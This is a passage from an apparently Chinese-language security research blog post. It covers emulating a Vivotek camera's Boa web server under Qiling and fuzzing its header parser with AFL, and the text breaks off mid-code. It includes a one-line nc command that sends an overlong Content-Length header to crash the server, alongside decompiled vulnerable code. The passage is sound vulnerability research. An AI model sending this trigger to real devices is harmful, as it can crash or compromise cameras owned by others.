  <span class="token function">SQUASH_KA</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token operator">:</span>            retval <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Unknown status (%d), "</span>                    <span class="token string">"closing!\n"</span><span class="token punctuation">,</span> current<span class="token operator">-&gt;</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span>            current<span class="token operator">-&gt;</span>status <span class="token operator">=</span> DEAD<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要看中间的Switch case：</p><ul><li>read_header：解析request头部，该函数类似FILE_IO函数<ul><li>request内部有8192+1字节的buffer，data的头尾指针等，最终调用bytes = read(req-&gt;fd, buffer + req-&gt;client_stream_pos, buf_bytes_left);读取client发送的请求</li><li>会提取并解析头部信息</li></ul></li><li>对于GET传参，主要使用read_header, read_from_pipe, write_from_pipe完成cgi的调用</li><li>对于POST传参，主要调用read_header, read_body, write_body完成cgi调用</li></ul><p>就拿read_header函数来说，厂商应该会在里面增加一些url过虑以及响应处理，在这个摄像头中漏洞也确实出在这个函数：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230130/image-20221213133117933.3iy0y3zs8pk0.png" alt="image-20221213133117933"></p><p>没有对<code>Content-Length</code>成员做限制；<strong>根据源码中提示字符串<code>Unknown status (%d), closing</code>可以轻松定位到这几个函数</strong>:</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230130/image-20221213133545416.2lz530gitdw0.png" alt="image-20221213133545416"></p><p>那么接下来就尝试利用Qiling 启动这个程序并且Partial Fuzz函数”read_header”</p><h2 id="模拟启动"><a href="#模拟启动" class="headerlink" title="模拟启动"></a>模拟启动</h2><p><strong>模拟启动的宗旨(我的)是遇到啥错误修最后一个报错点</strong></p><p>启动模板：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span> syssys<span class="token punctuation">.</span>path<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'/home/iot/workspace/Emulator/qiling-dev'</span><span class="token punctuation">)</span><span class="token keyword">from</span> qiling <span class="token keyword">import</span> Qiling<span class="token keyword">from</span> qiling<span class="token punctuation">.</span>const <span class="token keyword">import</span> QL_INTERCEPT<span class="token punctuation">,</span> QL_VERBOSE<span class="token keyword">def</span> <span class="token function">boa_run</span><span class="token punctuation">(</span>path<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">,</span> rootfs<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> profile<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'default'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ql <span class="token operator">=</span> Qiling<span class="token punctuation">(</span>path<span class="token punctuation">,</span> rootfs<span class="token punctuation">,</span> profile<span class="token operator">=</span>profile<span class="token punctuation">,</span> verbose<span class="token operator">=</span>QL_VERBOSE<span class="token punctuation">.</span>OFF<span class="token punctuation">,</span> multithread<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">"""setup files"""</span>    ql<span class="token punctuation">.</span>add_fs_mapper<span class="token punctuation">(</span><span class="token string">'/dev/null'</span><span class="token punctuation">,</span> <span class="token string">'/dev/null'</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">"""hooks"""</span>    ql<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span><span class="token string">'/home/iot/workspace/Emulator/qiling-dev/vivetok'</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'./rootfs/usr/sbin/httpd'</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"/etc/conf.d/boa"</span><span class="token punctuation">,</span> <span class="token string">"-d"</span><span class="token punctuation">]</span>    rootfs <span class="token operator">=</span> <span class="token string">'./rootfs'</span>    profile <span class="token operator">=</span> <span class="token string">'./boa_arm.ql'</span>    boa_run<span class="token punctuation">(</span>path<span class="token operator">=</span>path<span class="token punctuation">,</span> rootfs<span class="token operator">=</span>rootfs<span class="token punctuation">,</span> profile<span class="token operator">=</span>profile<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p><strong>尝试启动</strong></p><p>首先遇到的是：gethostbyname:: Success</p><p>在IDA中定位到：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230130/image-20221213134138571.5lp8sulizs80.png" alt="image-20221213134138571"></p><p>函数原型：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct hostent *gethostbyname(const char *hostname);struct hostent{    char *h_name;  //official name    char **h_aliases;  //alias list    int  h_addrtype;  //host address type    int  h_length;  //address lenght    char **h_addr_list;  //address list}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取返回的结构体还挺复杂的，问题的原因是 在调用<code>gethostname</code>将获得<strong>ql_vm</strong>作为主机名所以当以此调用<code>gethostbyname</code>无法获得主机信息，所以hook这个函数，并提前开辟空间存放伪造信息：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">"""struct hostent{    char *h_name;  //official name    char **h_aliases;  //alias list    int  h_addrtype;  //host address type    int  h_length;  //address lenght    char **h_addr_list;  //address list}"""def hook_memSpace(ql: Qiling):    ql.mem.map(0x1000, 0x1000, info='my_hook')    data = struct.pack('&lt;IIIII', 0x1100, 0x1100, AF_INET, 4, 0x1100)    ql.mem.write(0x1000, data)    ql.mem.write(0x1100, b'qiling')def lib_gethostbyname(ql: Qiling):    args = ql.os.resolve_fcall_params({'name':STRING})    print('[gethostbyname]: ' + args['name'])    ql.arch.regs.write('r0', 0x1000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还有一个严重问题就是模拟过程中程序自动采用<code>ipv6</code>协议，这就很烦因为qiling的ipv6协议支持的不是很好</p><h3 id="ipv6-socket"><a href="#ipv6-socket" class="headerlink" title="ipv6 socket"></a>ipv6 socket</h3><p><em><strong>AttributeError: ‘sockaddr_in’ object has no attribute ‘sin6_addr’</strong></em></p><p>问题处在对ipv6的系统调用bind：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">elif sa_family == AF_INET6 and ql.os.ipv6:    sockaddr_in6 = make_sockaddr_in(abits, endian)    sockaddr_obj = sockaddr_in6.from_buffer(data)    port = ntohs(ql, sockaddr_obj.sin_port)    host = inet6_ntoa(sockaddr_obj.sin6_addr.s6_addr)    if ql.os.bindtolocalhost:        host = '::1'    if not ql.os.root and port &lt;= 1024:        port = port + 8000def make_sockaddr_in(archbits: int, endian: QL_ENDIAN):    Struct = struct.get_aligned_struct(archbits, endian)    class in_addr(Struct):        _fields_ = (            ('s_addr', ctypes.c_uint32),        )    class sockaddr_in(Struct):        _fields_ = (            ('sin_family', ctypes.c_int16),            ('sin_port',   ctypes.c_uint16),            ('sin_addr',   in_addr),            ('sin_zero',   ctypes.c_byte * 8)        )    return sockaddr_indef make_sockaddr_in6(archbits: int, endian: QL_ENDIAN):    Struct = struct.get_aligned_struct(archbits, endian)    class in6_addr(Struct):        _fields_ = (            ('s6_addr', ctypes.c_uint8 * 16),        )    class sockaddr_in6(Struct):        _fields_ = (            ('sin6_family',   ctypes.c_int16),            ('sin6_port',     ctypes.c_uint16),            ('sin6_flowinfo', ctypes.c_uint32),            ('sin6_addr',     in6_addr),            ('sin6_scope_id', ctypes.c_uint32)        )    return sockaddr_in6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>make_sockaddr_in, make_sockaddr_in6基于<code>ctypes</code>构造严格的sockaddr结构体，因为是ipv6所以得用<code>make_sockaddr_in6</code></p><p>还有就是函数<code>(function) inet6_ntoa: (addr: bytes) -&gt; str</code>需要bytes对象而sockaddr_obj.sin6_addr.s6_addr是cbytes类型所以得<strong>bytes转</strong></p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">sockaddr_in6 = make_sockaddr_in6(abits, endian)sockaddr_obj = sockaddr_in6.from_buffer(data)port = ntohs(ql, sockaddr_obj.sin6_port)host = inet6_ntoa(bytes(sockaddr_obj.sin6_addr.s6_addr))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><em><strong>OSError: [Errno 98] Address already in use</strong></em></p><p>还是在调用bind时候，因为qiling会对低于1024的端口bind进行修改：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">if not ql.os.root and port &lt;= 1024:        port = port + 8000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>而后面还对8080端口进行一次bind，所以这里得改，然后其实就能进入核心处理逻辑了 ：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230130/image-20221213134113202.3u77el0qrm40.png" alt="image-20221213134113202"></p><p>当然还得看看链接有没有问题：尝试访问又出现问题</p><pre class="line-numbers language-Bash" data-language="Bash"><code class="language-Bash">$ echo -en "GET /index.html HTTP/1.0\n\rContent-Length:20\n\r\n\r"  | nc -v ::1 9080Connection to ::1 9080 port [tcp/*] succeeded!File "/home/iot/workspace/Emulator/qiling-dev-stb/qiling/os/posix/syscall/socket.py", line 669, in ql_syscall_accept    host, port = addressValueError: too many values to unpack (expected 2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em><strong>ValueError: too many values to unpack (expected 2)</strong></em></p><p>经调试原来在python中accept ipv6的连接后会返回一个长度为4的元组的address：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230130/image-20221213134207632.g2an31i3w54.png" alt="image-20221213134207632"></p><p>同样的问题还发生在ql_syscall_getsockname：<code>sockname = sock.getsockname()</code></p><p><em><strong>TypeError: expected c_ubyte_Array_16 instance, got int</strong></em></p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">[x]     Syscall ERROR: ql_syscall_accept DEBUG: expected c_ubyte_Array_16 instance, got intTraceback (most recent call last):  File "/home/iot/workspace/Emulator/qiling-dev-stb/qiling/os/posix/posix.py", line 280, in load_syscall    retval = syscall_hook(self.ql, *params)  File "/home/iot/workspace/Emulator/qiling-dev-stb/qiling/os/posix/syscall/socket.py", line 674, in ql_syscall_accept    obj.sin6_addr.s6_addr = inet6_aton(str(host))TypeError: expected c_ubyte_Array_16 instance, got int<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解决：bytes转cbyts类</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">obj.sin6_addr.s6_addr = (ctypes.c_ubyte * 16).from_buffer_copy(inet6_aton(str(host)).to_bytes(16, 'big'))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>主要问题就这些(修了挺久的)，然后就可以对一些函数进行fuzz了</p><h2 id="Fuzz-Partial"><a href="#Fuzz-Partial" class="headerlink" title="Fuzz Partial"></a>Fuzz Partial</h2><p>确定Fuzz范围，这个范围主要是给到ql_afl_fuzz函数，这里是打算Fuzz read_header函数(sub_17F80)，那么从数据入口下手：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230130/image-20221213135606979.6757a5dv0ck0.png" alt="image-20221213135606979"></p><p>读取POST或者GET方法的http包那么肯定要解析处理的，处理完成返回一个状态(源码中retval)来指示下一步处理，找到退出点：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230130/image-20221213135843221.u4ef529g3hc.png" alt="image-20221213135843221"><br>因此要从<code>0x180F8</code>附近开始Fuzz，然后<code>0x18398</code>表示函数正常退出将执行下一轮fuzz</p><p>脚本模板：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span> syssys<span class="token punctuation">.</span>path<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'/home/iot/workspace/Emulator/qiling-dev'</span><span class="token punctuation">)</span><span class="token keyword">from</span> qiling<span class="token punctuation">.</span>const <span class="token keyword">import</span> QL_INTERCEPT<span class="token punctuation">,</span> QL_VERBOSE<span class="token keyword">from</span> qiling <span class="token keyword">import</span> Qiling<span class="token keyword">from</span> qiling<span class="token punctuation">.</span>extensions<span class="token punctuation">.</span>afl <span class="token keyword">import</span> ql_afl_fuzz<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>input_file<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> trace<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ql <span class="token operator">=</span> Qiling<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'./rootfs/usr/sbin/httpd'</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"/etc/conf.d/boa"</span><span class="token punctuation">,</span> <span class="token string">"-d"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rootfs<span class="token operator">=</span><span class="token string">'./rootfs'</span><span class="token punctuation">,</span> profile<span class="token operator">=</span><span class="token string">'./boa_arm.ql'</span><span class="token punctuation">,</span> verbose<span class="token operator">=</span>QL_VERBOSE<span class="token punctuation">.</span>OFF<span class="token punctuation">,</span> console <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token keyword">if</span> trace <span class="token keyword">else</span> <span class="token boolean">False</span><span class="token punctuation">)</span>    ql<span class="token punctuation">.</span>restore<span class="token punctuation">(</span>snapshot<span class="token operator">=</span><span class="token string">'./context.bin'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">place_input_callback</span><span class="token punctuation">(</span>_ql<span class="token punctuation">:</span> Qiling<span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> _<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># print(b"**************** " + input)</span>        _ql<span class="token punctuation">.</span>mem<span class="token punctuation">.</span>write<span class="token punctuation">(</span>target_addr<span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token punctuation">)</span>            <span class="token keyword">def</span> <span class="token function">start_afl</span><span class="token punctuation">(</span>_ql<span class="token punctuation">:</span> Qiling<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Callback from inside        """</span>        ql_afl_fuzz<span class="token punctuation">(</span>_ql<span class="token punctuation">,</span> input_file<span class="token operator">=</span>input_file<span class="token punctuation">,</span> place_input_callback<span class="token operator">=</span>place_input_callback<span class="token punctuation">,</span> exits<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x018398</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    ql<span class="token punctuation">.</span>hook_address<span class="token punctuation">(</span>callback<span class="token operator">=</span>start_afl<span class="token punctuation">,</span> address<span class="token operator">=</span><span class="token number">0x180F8</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># ql.debugger = True</span>        ql<span class="token punctuation">.</span>run<span class="token punctuation">(</span>begin<span class="token operator">=</span><span class="token number">0x180F8</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> trace<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nFuzzer Went Shit"</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"No input file provided."</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span><span class="token string">'/home/iot/workspace/Emulator/qiling-dev/vivetok'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">2</span> <span class="token keyword">and</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"-t"</span><span class="token punctuation">:</span>        main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> trace<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ql.hook_address(callback=start_afl, address=0x180F8)：在执行到<code>0x180F8</code>这个位置时调用start_afl函数</li><li>ql.run(begin=0x180F8)：从<code>0x180F8</code>开始执行</li><li>ql_afl_fuzz：就是unicornafl提供的fuzz接口<code>uc_afl_fuzz_custom</code>的一个wrapper</li><li>place_input_callback：ql_afl_fuzz会调用的回调函数，负责写入fuzz数据</li></ul><h2 id="Fuzz-buf"><a href="#Fuzz-buf" class="headerlink" title="Fuzz buf"></a>Fuzz buf</h2><p>根据网上的漏洞分析比对源码框架，利用:</p><pre class="line-numbers language-Bash" data-language="Bash"><code class="language-Bash">cho -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXXnrnrn"  | nc -v ::1 9080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以触发漏洞，具体位于框架中http头部解析函数：read_header，位于httpd中17F80位置</p><p>那么该如何fuzz呢，根据网上unicorn-afl官方用例和qiling官方用例：buf-fuzz，即定位代码中读取数据位置，然后读取完后劫持搜索特定字符串定位fuzz的buff_addr，当然需要状态保存(当然这个方法肯定不是很严谨，因此后面还会介绍劫持read函数方法)</p><h3 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import os, sys, structfrom socket import AF_INETsys.path.append('/home/iot/workspace/Emulator/qiling-dev')from qiling import Qilingfrom qiling.const import QL_INTERCEPT, QL_VERBOSEfrom qiling.os.const import STRINGfrom unicorn.unicorn import UcError"""struct hostent{    char *h_name;  //official name    char **h_aliases;  //alias list    int  h_addrtype;  //host address type    int  h_length;  //address lenght    char **h_addr_list;  //address list}"""def hook_memSpace(ql: Qiling):    ql.mem.map(0x1000, 0x1000, info='my_hook')    data = struct.pack('&lt;IIIII', 0x1100, 0x1100, AF_INET, 4, 0x1100)    ql.mem.write(0x1000, data)    ql.mem.write(0x1100, b'qiling')def lib_gethostbyname(ql: Qiling):    args = ql.os.resolve_fcall_params({'name':STRING})    print('[gethostbyname]: ' + args['name'])    ql.arch.regs.write('r0', 0x1000)    def saver(ql: Qiling):    print('[!] Hit Saver 0x%X'%(ql.arch.regs.arch_pc))    ql.save(cpu_context=False, snapshot='./context.bin')    print(ql.mem.search(b'fuck'))#[read(5,  0x4edca,  0x2000)] locate bufdef read_syscall(ql: Qiling, fd: int, buf: int, size: int, *args) -&gt; None:    print(f'[read({fd}, {buf: #x}, {size: #x})]')def boa_run(path: list, rootfs: str, profile: str = 'default'):    ql = Qiling(path, rootfs, profile=profile, verbose=QL_VERBOSE.OFF, multithread=False)    """setup files"""    ql.add_fs_mapper('/dev/null', '/dev/null')    """set ram"""    hook_memSpace(ql)    """hooks"""    ql.os.set_api('gethostbyname', lib_gethostbyname, QL_INTERCEPT.CALL)    ql.os.set_syscall('read', read_syscall, QL_INTERCEPT.ENTER)    """setup saver"""    ql.hook_address(saver, 0x0180FC)        #read finish    ql.run()    if __name__ == '__main__':    os.chdir('/home/iot/workspace/Emulator/qiling-dev/vivetok')    path = ['./rootfs/usr/sbin/httpd', "-c", "/etc/conf.d/boa", "-d"]    rootfs = './rootfs'    profile = './boa_arm.ql'    boa_run(path=path, rootfs=rootfs, profile=profile)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后使用poc触发就行</p><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import os, sys, structimport capstone as Cssys.path.append('/home/iot/workspace/Emulator/qiling-dev')from qiling.const import QL_INTERCEPT, QL_VERBOSEfrom qiling import Qilingfrom qiling.extensions.afl import ql_afl_fuzzdef simple_diassembler(ql: Qiling, address: int, size: int, md: Cs) -&gt; None:    buf = ql.mem.read(address, size)    for insn in md.disasm(buf, address):        ql.log.debug(f':: {insn.address:#x} : {insn.mnemonic:24s} {insn.op_str}')def main(input_file: str, trace: bool = False):    ql = Qiling(['./rootfs/usr/sbin/httpd', "-c", "/etc/conf.d/boa", "-d"], rootfs='./rootfs', profile='./boa_arm.ql', verbose=QL_VERBOSE.OFF, console = True if trace else False)    ql.restore(snapshot='./context.bin')    fuzz_mem = ql.mem.search(b'fuck')        target_addr = fuzz_mem[0]    def place_input_callback(_ql: Qiling, input: bytes, _):        # print(b"**************** " + input)        _ql.mem.write(target_addr, input)            def start_afl(_ql: Qiling):        """        Callback from inside        """        ql_afl_fuzz(_ql, input_file=input_file, place_input_callback=place_input_callback, exits=[0x018398])    ql.hook_address(callback=start_afl, address=0x0180FC+4)    # ql.hook_code(simple_diassembler, begin=0x0180FC, end=0x018600, user_data=ql.arch.disassembler)    try:        # ql.debugger = True        ql.run(begin=0x0180FC+4, end=0x018600)    #注意arm函数返回地址比较奇怪，不一定在函数末尾        os._exit(0)    except:        if trace:            print("\nFuzzer Went Shit")        os._exit(0)  if __name__ == "__main__":    if len(sys.argv) == 1:        raise ValueError("No input file provided.")        os.chdir('/home/iot/workspace/Emulator/qiling-dev/vivetok')    if len(sys.argv) &gt; 2 and sys.argv[1] == "-t":        main(sys.argv[2], trace=True)    else:        main(sys.argv[1])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里很坑的一点是，在漏洞中因为<code>Content-Length</code>成员不以\n结尾时就会让v31等于0会让strncpy报错但是不一定是pc指针错误，而是某些指令地址操作数问题</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">v30 = strstr(haystack, "Content-Length");v31 = strchr(v30, '\n');v32 = strchr(v30, ':');strncpy(dest, v32 + 1, v31 - (v32 + 1));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在源码中AFL模块调用以下函数完成fuzz执行：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">def _dummy_fuzz_callback(_ql: "Qiling"):            if isinstance(_ql.arch, QlArchARM):                pc = _ql.arch.effective_pc            else:                pc = _ql.arch.regs.arch_pc            try:                _ql.uc.emu_start(pc, 0, 0, 0)            except UcError as e:                os.abort() #添加部分                return e.errno            <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此添加<code>os.abort</code>通知AFL程序崩溃</p><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230130/image-20221213140214049.5ht4oquer8o0.png" alt="image-20221213140214049"></p><h2 id="Fuzz-sys-read"><a href="#Fuzz-sys-read" class="headerlink" title="Fuzz sys_read"></a>Fuzz sys_read</h2><p>上面直接对buf写入Fuzz数据肯定不是一个很理想的办法(比如Fuzz数据超出读取长度)，当然人家给的例子就是这么Fuzz的也不失一种方法；之后</p><p>就尝试利用Qiling的系统调用劫持功能让Fuzz效果更好。</p><p>从read函数调用处开始执行，在这之前劫持read函数调用让程序直接读取文件输入：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">read_syscall</span><span class="token punctuation">(</span>ql<span class="token punctuation">:</span> Qiling<span class="token punctuation">,</span> fd<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> buf<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">:</span>    <span class="token comment"># print(fd, buf, size)</span>    data <span class="token operator">=</span> ql<span class="token punctuation">.</span>os<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>read<span class="token punctuation">(</span>size<span class="token punctuation">)</span>    <span class="token comment"># print(data)</span>    ql<span class="token punctuation">.</span>mem<span class="token punctuation">.</span>write<span class="token punctuation">(</span>buf<span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">place_input_callback</span><span class="token punctuation">(</span>_ql<span class="token punctuation">:</span> Qiling<span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> _<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># print(b"**************** " + input)</span>    ql<span class="token punctuation">.</span>os<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">def</span> <span class="token function">start_afl</span><span class="token punctuation">(</span>_ql<span class="token punctuation">:</span> Qiling<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Callback from inside    """</span>    ql_afl_fuzz<span class="token punctuation">(</span>_ql<span class="token punctuation">,</span> input_file<span class="token operator">=</span>input_file<span class="token punctuation">,</span> place_input_callback<span class="token operator">=</span>place_input_callback<span class="token punctuation">,</span> exits<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x018398</span><span class="token punctuation">]</span><span class="token 